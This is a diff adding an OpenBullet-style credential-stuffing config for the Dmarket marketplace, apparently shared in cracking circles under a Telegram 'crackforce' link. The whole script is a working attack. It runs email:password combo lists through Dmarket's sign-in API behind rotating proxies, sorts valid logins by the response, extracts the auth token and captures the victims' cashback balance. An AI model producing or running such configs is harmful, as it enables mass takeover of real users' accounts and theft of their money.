@@ -1,0 +1,104 @@
+[SETTINGS]
+{
+  "Name": "Dmarket",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-13T16:54:22.6336494+02:00",
+  "AdditionalInfo": "https://t.me/crackforce",
+  "Author": "@CONFIG_COMBO",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.dmarket.com/marketplace-api/v1/sign-in" 
+  CONTENT "{\"Email\":\"<USER>\",\"Password\":\"<PASS>\",\"ReCaptchaCode\":\"\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-length: 81" 
+  HEADER "content-type: application/json" 
+  HEADER "language: EN" 
+  HEADER "origin: https://dmarket.com" 
+  HEADER "referer: https://dmarket.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Bad credentials" 
+  KEYCHAIN Success OR 
+    KEY "AuthToken" 
+
+PARSE "<SOURCE>" JSON "AuthToken" -> VAR "AuthToken" 
+
+REQUEST GET "https://api.dmarket.com/marketplace-api/v1/cashback/balance" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "authorization: <AuthToken>" 
+  HEADER "language: EN" 
+  HEADER "origin: https://dmarket.com" 
+  HEADER "referer: https://dmarket.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+
+#Currency PARSE "<SOURCE>" JSON "Currency" CreateEmpty=FALSE -> CAP "Currency" 
+
+#Amount PARSE "<SOURCE>" JSON "Amount" CreateEmpty=FALSE -> CAP "Amount" 
+
+FUNCTION Constant "@CONFIG_COMBO" -> CAP "Config By" 
+
